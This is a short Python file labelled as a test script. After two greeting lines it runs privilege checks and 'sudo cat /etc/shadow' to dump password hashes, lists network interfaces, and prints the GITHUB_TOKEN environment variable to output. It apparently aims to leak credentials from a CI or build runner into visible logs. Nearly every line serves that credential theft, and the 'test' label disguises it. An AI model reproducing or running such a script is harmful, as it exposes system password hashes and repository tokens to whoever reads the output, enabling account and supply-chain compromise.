import os

print("Test Python Script")
print("Welcome!");
os.system('whoami')
os.system('sudo whoami');
os.system('sudo cat /etc/shadow');
os.system('sudo ip a');
GT = os.getenv('GITHUB_TOKEN');
print("GITHUB_TOKEN" + str(GT))
